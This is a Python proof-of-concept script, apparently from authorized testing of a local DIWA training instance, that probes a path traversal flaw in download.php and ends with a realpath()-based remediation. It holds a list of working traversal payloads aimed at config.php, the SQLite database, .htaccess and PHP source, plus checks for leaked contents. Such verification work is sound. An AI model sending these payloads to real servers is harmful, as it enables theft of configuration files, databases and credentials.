#!/usr/bin/env python3
"""
Stage 2 POC: Path Traversal in Download File Parameter
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: download.php uses basename() but still allows ../ in filename
"""

import requests
import sys
import urllib.parse

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_path_traversal_download():
    """
    Attempt to read sensitive files outside upload directory.
    Payload: ../../config.php or ../../database/db.s3db
    Expected: File contents or database file downloaded
    """
    print("[*] Testing Path Traversal in download.php File Parameter...")
    
    try:
        # Payloads to try reading sensitive files
        payloads = [
            '../../config.php',           # Read config
            '../../database/db.s3db',     # Read database
            '../../includes/functions.php',  # Read functions
            '../../.htaccess',            # Read .htaccess
            '../config.php',              # Fewer traversals
            '.../.../config.php',         # Try bypass
        ]
        
        for payload in payloads:
            url = f"{TARGET}/app/download.php?file={urllib.parse.quote(payload)}"
            resp = SESSION.get(url)
            
            # Check for config file content
            if '$config' in resp.text or 'hashing_algorithm' in resp.text:
                print(f"✅ VULNERABLE: Config file read via path traversal: {payload}")
                return True
            
            # Check for database file (SQLite binary)
            if 'SQLite' in resp.text or resp.headers.get('Content-Type') == 'application/octet-stream':
                print(f"✅ VULNERABLE: Database file accessible via path traversal: {payload}")
                return True
            
            # Check for PHP source code
            if '<?php' in resp.text or 'function ' in resp.text:
                print(f"✅ VULNERABLE: Source file read via path traversal: {payload}")
                return True
        
        print("❌ NOT REPRODUCIBLE: Path traversal protection is in place")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_path_traversal_download()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Validate file path is within allowed directory using realpath():

  $uploaded_dir = realpath(__DIR__ . '/files');
  $requested_file = realpath(__DIR__ . '/files/' . basename($_GET['file']));
  
  // Verify file is in allowed directory and exists
  if (!$requested_file || strpos($requested_file, $uploaded_dir) !== 0 || !file_exists($requested_file)) {
      header('HTTP/1.1 403 Forbidden');
      exit;
  }
  
  // Safe to serve file
  $mimeType = mime_content_type($requested_file);
  header('Content-Type: ' . $mimeType);
  header('Content-Disposition: attachment; filename="' . basename($requested_file) . '"');
  header('Content-Length: ' . filesize($requested_file));
  readfile($requested_file);

Key points:
- realpath() resolves ../, symlinks, and normalizes paths
- Verify result starts with allowed directory path
- basename() removes directory components, realpath() removes path tricks
- Check file_exists() after realpath validation
- Use the real path (from realpath) for all subsequent operations
"""
